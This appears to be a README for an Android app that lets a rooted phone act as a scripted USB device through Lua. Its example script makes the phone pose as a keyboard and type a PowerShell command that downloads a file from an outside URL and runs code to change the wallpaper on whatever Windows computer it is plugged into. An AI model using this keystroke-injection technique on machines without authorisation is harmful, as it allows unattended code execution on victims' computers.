# Android USB Script

**Use at your own risk. For educational purposes only.**

An Android app that provides a simple Lua interface for enumerating and interfacing
with arbitrary composite USB devices.

**Root access is required.**

## [Demonstration](https://streamable.com/oeyrik)

The best way to explain what this app does is with a code example. The following script
does the following when interpreted by this app:

1. Configures your phone to become a USB keyboard
2. Sends a series of key presses to the computer your phone is plugged in to, changing
its wallpaper

```lua
-- create a USB composite device composed of a single keyboard
usb = luausb.create({ id = 0, type = "keyboard" })
kb = usb.dev[1]

local file = "https://i.redd.it/ur1mqcbpxou51.png"

while true do
    -- wait for the phone to be plugged into a computer
    while not kb.test() do usb.delay(1000) end

    usb.delay(1000)

    kb.press_keys(kb.LSUPER, kb.R)  -- open the Windows run dialog
    usb.delay(2000)                 -- wait 2 seconds
    kb.send_string("powershell\n")  -- pop open a powershell window
    usb.delay(2000)

    -- enter a script that changes your wallpaper
    kb.send_string("[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ..
            "(new-object System.Net.WebClient).DownloadFile('" .. file .. "',\"$Env:Temp\\b.jpg\");\n" ..
            "Add-Type @\"\n" ..
            "using System;using System.Runtime.InteropServices;using Microsoft.Win32;namespa" ..
            "ce W{public class S{ [DllImport(\"user32.dll\")]static extern int SystemParamet" ..
            "ersInfo(int a,int b,string c,int d);public static void SW(string a){SystemParam" ..
            "etersInfo(20,0,a,3);RegistryKey c=Registry.CurrentUser.OpenSubKey(\"Control Pan" ..
            "el\\\\Desktop\",true);c.SetValue(@\"WallpaperStyle\", \"2\");c.SetValue(@\"Tile" ..
            "Wallpaper\", \"0\");c.Close();}}}\n" ..
            "\"@\n" ..
            "[W.S]::SW(\"$Env:Temp\\b.jpg\")\n" ..
            "exit\n")

    -- wait for the phone to be unplugged
    while kb.test() do usb.delay(1000) end
end
```

## Requirements
**This app will not work on every Android device.** If your Android OS has Linux Kernel
version >= 3.18 and is compiled with configfs and f_hid, then the app can try to create usb
gadgets.

New demo applications can be added to `assets/scripts`. The API is pretty much self-documenting,
just look at the existing demos to get a feel for how the API works.

## Third-party
- [libsuperuser](https://github.com/Chainfire/libsuperuser)
- [LuaJ](http://www.luaj.org/luaj/3.0/README.html)
